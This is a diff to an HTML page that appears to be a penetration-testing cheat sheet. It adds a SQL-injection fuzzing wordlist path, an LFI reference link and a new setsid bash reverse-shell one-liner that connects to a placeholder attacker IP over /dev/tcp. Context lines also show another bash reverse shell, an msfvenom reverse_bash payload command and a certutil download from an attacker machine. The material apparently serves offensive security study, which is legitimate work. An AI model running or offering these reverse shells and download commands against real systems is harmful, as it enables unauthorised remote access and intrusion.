@@ -85,6 +85,9 @@ NULL or null	(Possible error messages returned)
 – , = , + , ”	(Used to craft SQL Injection queries)
 ‘ , &, ! , ¦ , < , >	(Used to find command execution vulnerabilities)
 ../	(Directory Traversal Vulnerabilities)
+
+#Fuzz?
+/usr/share/wordlists/wfuzz/Injections/SQL.txt
 </pre>
 <p><font size="3.5" color="black">- Wordpress?</font></p>
 <pre style="background-color:black;color:white;">
@@ -113,6 +116,11 @@ joomlavs.rb -u [TARGET_URL] --scan-all	(Check -h option for help)
 <p><h3>XSS</h3></p>
 <p><font size="3.5" color="black">XSS Filter Evasion Cheat Sheet - https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#Basic_XSS_Test_Without_Filter_Evasion</font></p>
 <p><font size="3.5" color="black">XSS Filter Evasion eval(String.fromCharCode() method - http://jdstiles.com/java/cct.html
+<hr>
+<p><h3>LFI</h3></p>
+<pre style="background-color:black;color:white;">
+#Great read - https://highon.coffee/blog/lfi-cheat-sheet/	#PHP wrappers etc
+</pre>
 <hr>
 <p><h3>DNS port discovered?</h3></p>
 <pre style="background-color:black;color:white;">
@@ -495,6 +503,7 @@ Response.write(o)
 </pre>
 <p><font size="3.5" color="black">Bash</font></p>
 <pre style="background-color:black;color:white;">
+setsid /bin/bash -i >/dev/tcp/[ATTACKER's_IP_ADDRESS]/[ATTACKER's_PORT] 0<&1 2>&1	(reverse shell - "setsid" is used to create a new session)
 bash -i >& /dev/tcp/[ATTACKER's_IP_ADDRESS]/[ATTACKER's_PORT] 0>&1	(reverse shell)
 msfvenom -p cmd/unix/reverse_bash LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f raw > shell.sh	(reverse shell using msfvenom)
 </pre>
@@ -604,6 +613,7 @@ os.execute('/bin/sh')
 certutil -urlcache -split -f http://[ATTACKERS_MACHINE]/[FILE_TO_TRANSFER] C:\\users\public\[FILE_TO_TRANSFER]	#certutil method
 </pre>
 <p><font size="3.5" color="black">- https://blog.ropnop.com/transferring-files-from-kali-to-windows/</font></p>
+<p><font size="3.5" color="black">- SecureCopy (scp) - http://www.hypexr.org/linux_scp_help.php</font></p>
 <hr>
 <p><h3>Privilege Escalation</h3></p>
 <p><font size="3.5" color="black">Windows:</font></p>
